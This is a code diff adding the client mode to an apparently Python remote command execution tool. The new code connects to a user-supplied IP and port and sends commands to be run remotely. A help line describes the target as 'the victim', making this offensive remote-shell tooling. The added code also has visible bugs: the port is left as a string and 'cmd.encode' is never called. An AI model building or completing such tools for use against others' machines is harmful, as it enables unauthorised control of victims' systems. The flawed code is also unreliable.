@@ -30,7 +30,25 @@ def rceServerMode():
             client_socket.send(salida.encode())
             
 def rceClientMode():
-    pass
+    ip = input('Enter the ip')
+    port = input('Enter the port')
+    server_address = (ip, port)
+    
+    client_socket = socket()
+    client_socket.connect(server_address)
+    
+    status = True
+    while status:
+        cmd = input("Enter a cmd ('exit' to close)")
+        
+        if cmd == 'exit':
+            client_socket.send(cmd.encode())
+            client_socket.close()
+            status = False
+        else:
+            client_socket.send(cmd.encode)
+            request = client_socket.recv(4096)
+            print(request.decode())
     
 def showOptions():
     print("-s >> Set RCE as server mode (the victim make a connection to you)\n"
